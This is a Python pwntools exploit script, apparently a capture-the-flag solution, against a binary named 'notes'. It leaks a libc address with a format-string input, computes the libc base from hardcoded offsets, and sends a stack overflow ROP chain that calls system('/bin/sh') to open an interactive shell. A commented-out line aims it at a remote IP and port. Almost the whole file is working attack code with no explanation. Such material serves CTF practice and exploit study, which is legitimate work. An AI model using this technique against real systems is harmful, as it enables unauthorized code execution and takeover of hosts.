#!/usr/bin/env python3

from pwn import *
exe = './notes'

pwn = context.binary = ELF(exe)
libc =ELF('/lib/x86_64-linux-gnu/libc.so.6')

# sh = remote("43.198.227.172", 8087)
sh = process()

if args.GDB: gdb.attach(sh, "b *main")

sh.sendlineafter(b"$ ", b"1")
sh.sendlineafter(b"note: ", b"|%27$p|")
sh.sendlineafter(b"$ ", b"2")
sh.sendlineafter(b": ", b"0")

leak = int(sh.recvline().split(b"|")[1], 16)

#libc.address = leak - libc.sym['__libc_start_main']

libc.address = leak - 0x27c8a

print("libc_base @ %#x " % libc.address)



pop_rdi = libc.address + 0x28215
ret = libc.address + 0x2668c


payload = flat([
     cyclic(276),
     pop_rdi,
     next(libc.search(b'/bin/sh\x00')),
     ret,
     libc.sym.system
])


sh.sendline(b"0")
sh.recvuntil(b'$ ')
sh.sendline(b"1")
sh.sendline(payload)

sh.interactive()
